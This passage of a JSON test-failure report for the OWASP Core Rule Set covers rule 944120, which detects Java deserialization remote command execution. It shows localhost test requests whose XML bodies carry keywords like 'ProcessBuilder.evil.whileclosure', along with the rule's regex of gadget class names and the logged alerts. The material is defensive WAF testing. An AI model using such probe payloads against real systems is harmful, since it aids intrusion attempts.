    "test" : {
      "test_id" : 91,
      "desc" : "XML element includes keyword ProcessBuilder.evil.prototypeclonefactory",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.prototypeclonefactory attribute_name=\"attribute_value\">value</ProcessBuilder.evil.prototypeclonefactory></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 92,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.prototypeclonefactory",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 92,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.prototypeclonefactory",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.prototypeclonefactory=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 108,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.prototypeserializationfactory",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 108,
      "desc" : "XML element includes keyword ProcessBuilder.evil.prototypeserializationfactory",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.prototypeserializationfactory attribute_name=\"attribute_value\">value</ProcessBuilder.evil.prototypeserializationfactory></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 109,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.prototypeserializationfactory",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 109,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.prototypeserializationfactory",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.prototypeserializationfactory=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 125,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML element includes keyword ProcessBuilder.evil.whileclosure",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 125,
      "desc" : "XML element includes keyword ProcessBuilder.evil.whileclosure",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><ProcessBuilder.evil.whileclosure attribute_name=\"attribute_value\">value</ProcessBuilder.evil.whileclosure></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944120",
    "test_id" : 126,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944120.yaml",
    "description" : "XML attribute name includes keyword ProcessBuilder.evil.whileclosure",
    "cause" : "failed no_expect_ids check: 944120 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944120 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)", "phase=2 rule_id=944240 - Remote Command Execution: Java serialization (CVE-2015-4852)" ]
    },
    "test" : {
      "test_id" : 126,
      "desc" : "XML attribute name includes keyword ProcessBuilder.evil.whileclosure",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element ProcessBuilder.evil.whileclosure=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944120,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Magic bytes detected and payload included possibly RCE vulnerable classes detected and process execution methods detected"
        }, {
          "type" : "Comment",
          "text" : " anomaly score set to critical as all conditions indicate the request try to perform RCE."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:clonetransformer|forclosure|instantiatefactory|instantiatetransformer|invokertransformer|prototypeclonefactory|prototypeserializationfactory|whileclosure|getproperty|filewriter|xmldecoder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java serialization (CVE-2015-4852)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
